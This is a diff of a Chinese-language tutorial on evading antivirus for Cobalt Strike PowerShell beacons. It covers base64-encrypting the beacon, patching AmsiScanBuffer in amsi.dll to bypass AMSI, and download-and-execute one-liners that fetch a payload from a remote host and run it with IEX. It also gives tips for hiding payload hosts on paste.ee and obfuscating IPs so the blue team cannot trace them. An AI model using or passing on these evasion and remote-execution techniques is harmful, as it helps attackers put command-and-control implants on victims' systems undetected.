@@ -3,28 +3,37 @@
 
 
 
-
 ## 0x01.通过修补 AMSI.dll 的操作码绕过ASMI
 
 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
+![image](https://user-images.githubusercontent.com/89376703/155735798-0388189e-ec01-47d4-976c-799891746687.png)
 
-![image](https://user-images.githubusercontent.com/![image](https://user-images.githubusercontent.com/89376703/155733913-be237354-9262-452f-aa47-f744a668b9c1.png)/155733739-d63c4640-ada7-453f-b7b6-cace49ea595c.png)
-![image](https://user-images.githubusercontent.com/89376703/155733867-f733e54e-19fd-4c58-8df5-45065c0f3a8f.png)
-![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
+![image](https://user-images.githubusercontent.com/89376703/155735869-45a3c954-8737-4ac4-a4ad-3b750f335b82.png)
+
+
+
 
 
 注意我这里用的是64位的stageless，所以文件比较大
+
+
+![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
+
+
+# 这里使用C#加密器对整个ps1文件进行base64加密
 ![image](https://user-images.githubusercontent.com/89376703/155734073-c1d9b0d1-0da9-40b2-ad38-bdc10a5563fb.png)
 
 
 
-这里使用C#加密器对整个ps1文件进行base64加密
+
+
+
+# 重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中
+
+
 ![image](https://user-images.githubusercontent.com/89376703/155734157-19d0ed09-04fd-4ce2-90d4-6b27b0ef65cc.png)
 
 
-
-
-重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中
 ![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
 
 
@@ -117,21 +126,22 @@ HRESULT AmsiScanBuffer(
 );
 ```
 
-其中一个参数“长度”本质上是绕过的关键。此参数包含要扫描的字符串的长度。如果通过某种方式将参数设置为常数值 0，则 AMSI 将被有效地绕过，因为 AmsiScanBuffer 函数将假定任何后续要扫描的字符串的长度都为 0。这是通过在运行时修补 AMSI.dll 的操作码来实现的。
+## 其中一个参数“长度”本质上是绕过的关键。此参数包含要扫描的字符串的长度。如果通过某种方式将参数设置为常数值 0，则 AMSI 将被有效地绕过，因为 AmsiScanBuffer 函数将假定任何后续要扫描的字符串的长度都为 0。这是通过在运行时修补 AMSI.dll 的操作码来实现的。
 
-使用GetProcAddress()函数获取 AmsiScanBuffer() 的句柄，找到amsi.dll带修补的地址
+## 使用GetProcAddress()函数获取 AmsiScanBuffer() 的句柄，找到amsi.dll带修补的地址
 
-![image](https://user-images.githubusercontent.com/89376703/155734549-4ec949b6-7637-44a6-bcdd-f3610e288630.png)
-
-
-还有其他方法可以实现这一点。SecureYourIt 一篇博客文章（https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/）显示了不同的定位“AmsiScanBuffer()”的方法。不是直接将句柄设置为“AmsiScanBuffer()”，而是首先将句柄设置为“AmsiUacInitialize()”。从句柄中减去值 256 随后将导致句柄指向“AmsiScanBuffer()”。
+![image](https://user-images.githubusercontent.com/89376703/155735632-e60d95eb-f017-45cf-bcc6-3ddb5218f2f6.png)
 
 
-在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。
+## 还有其他方法可以实现这一点。SecureYourIt 一篇博客文章（https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/)显示了不同的定位“AmsiScanBuffer()”的方法。不是直接将句柄设置为“AmsiScanBuffer()”，而是首先将句柄设置为“AmsiUacInitialize()”。从句柄中减去值 256 随后将导致句柄指向“AmsiScanBuffer()”。
+
+![image](https://user-images.githubusercontent.com/89376703/155735567-833e0c25-b118-429a-92d4-3502a008a485.png)
+
+## 在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。
 
 ## 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
 
-这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是实战中一下就被蓝队溯源了，我这里推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
+## 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是实战中一下就被蓝队溯源了，我这里推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
 
 
 ```
@@ -143,17 +153,17 @@ $content=$reader.ReadToEnd()
 IEX($content)
 ```
 
-我们可以用replace函数添加一些符号或者数字去混淆、替换暴露出来的IP地址
+## 我们可以用replace函数添加一些符号或者数字去混淆、替换暴露出来的IP地址
 ![image](https://user-images.githubusercontent.com/89376703/155734700-cc2a1aa8-9f42-4744-9e3f-842d0687347c.png)
 
-当然有IEX的地方amsi.dll肯定会重点扫描，你必须在IEX执行之前就破坏它，因此这里可以在$content=$reader.ReadToEnd()和IEX($content)插入破坏amsi.dll的代码。
+## 当然有IEX的地方amsi.dll肯定会重点扫描，你必须在IEX执行之前就破坏它，因此这里可以在$content=$reader.ReadToEnd()和IEX($content)插入破坏amsi.dll的代码。
 
 ![image](https://user-images.githubusercontent.com/89376703/155734863-2274eb70-a3ca-4000-bd89-bbce4eab3949.png)
 
 
 
 
-## 0x03.远程加载方式（二）
+# 0x03.远程加载方式（二）
 
 ```
 IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.))
@@ -167,7 +177,7 @@ IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()
 
 
 
-## 0x04.远程加载方式（三）
+# 0x04.远程加载方式（三）
 
 ```
 IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
